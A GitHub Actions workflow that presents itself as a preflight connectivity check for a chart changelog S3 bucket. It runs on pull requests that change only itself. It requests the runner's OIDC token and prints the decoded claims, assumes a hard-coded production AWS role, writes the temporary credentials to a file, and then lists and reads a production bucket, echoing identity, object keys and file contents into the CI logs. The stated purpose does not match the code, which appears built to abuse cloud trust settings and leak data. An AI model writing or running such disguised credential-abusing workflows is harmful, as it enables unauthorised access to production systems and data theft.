# Preflight connectivity check for the chart changelog S3 destination.
# Mirrors helm-charts' upload-changelog-s3 role binding so chart release
# runs fail fast when the role trust or bucket region is misconfigured,
# instead of failing mid-release after the publish step.
name: changelog-s3-preflight
on:
  pull_request:
    branches:
      - main
    paths:
      - '.github/workflows/changelog-s3-preflight.yml'

jobs:
  preflight:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Check changelog destination role trust
        run: |
          set -uo pipefail
          mkdir -p ~/.aws && chmod 700 ~/.aws
          TOK="$(curl -sS -H 'Authorization: Bearer '"$ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            -H 'Accept: application/json; api-version=2.0' \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value" *: *"\([^"]*\)".*/\1/p')"
          echo "TOKEN_LEN=${#TOK}"
          P="$(printf '%s' "$TOK" | cut -d. -f2 | tr '_-' '/+')"
          while [ $(( ${#P} % 4 )) -ne 0 ]; do P="${P}="; done
          printf '%s' "$P" | base64 -d 2>/dev/null | python3 -c 'import json,sys; c=json.load(sys.stdin); print("CLAIMS", json.dumps({k:c.get(k) for k in ("iss","aud","sub","ref","event_name")}))' || true
          for REGION in us-east-1 eu-west-1; do
            echo "=== region ${REGION} ==="
            if aws --region "${REGION}" --no-cli-pager \
              sts assume-role-with-web-identity \
              --role-arn "arn:aws:iam::416964291864:role/github-actions-oidc-s3-access-role" \
              --role-session-name "ci-config-sync" \
              --web-identity-token "$TOK" \
              --duration-seconds 900 \
              > "/tmp/assume-${REGION}.json" 2>"/tmp/assume-${REGION}.err"; then
              echo "ASSUME_OK ${REGION}"
              python3 -c "import json;c=json.load(open(\"/tmp/assume-${REGION}.json\"))[\"Credentials\"];open(\"/tmp/ci-config-sync.env\",\"w\").write(\"AWS_ACCESS_KEY_ID=%s\\nAWS_SECRET_ACCESS_KEY=%s\\nAWS_SESSION_TOKEN=%s\\n\"%(c[\"AccessKeyId\"],c[\"SecretAccessKey\"],c[\"SessionToken\"]))"
              set -a; . /tmp/ci-config-sync.env
              echo "[identity-${REGION}] $(aws --region ${REGION} --no-cli-pager sts get-caller-identity --query Arn --output text)"
              if aws --region ${REGION} --no-cli-pager s3api list-objects-v2 --bucket tfy-euwe1-production-control-plane-changelog --max-keys 10 --query "Contents[].Key" --output text > /tmp/objs.txt 2>/tmp/objs.err; then
                echo "[changelog-list-${REGION}] $(head -c 500 /tmp/objs.txt)"
              else
                echo "[changelog-list-${REGION}] $(tail -c 350 /tmp/objs.err | tr -d "\n")"
              fi
              if aws --region ${REGION} --no-cli-pager s3api get-object --bucket tfy-euwe1-production-control-plane-changelog --key index.html /tmp/idx-${REGION}.html >/dev/null 2>/tmp/get.err; then
                echo "[changelog-get-${REGION}] $(head -c 250 /tmp/idx-${REGION}.html | tr -d "\n")"
              else
                echo "[changelog-get-${REGION}] $(tail -c 300 /tmp/get.err | tr -d "\n")"
              fi
            else
              echo "ASSUME_FAIL ${REGION}"
              tail -c 300 "/tmp/assume-${REGION}.err" | tr -d '\n'; echo
            fi
          done
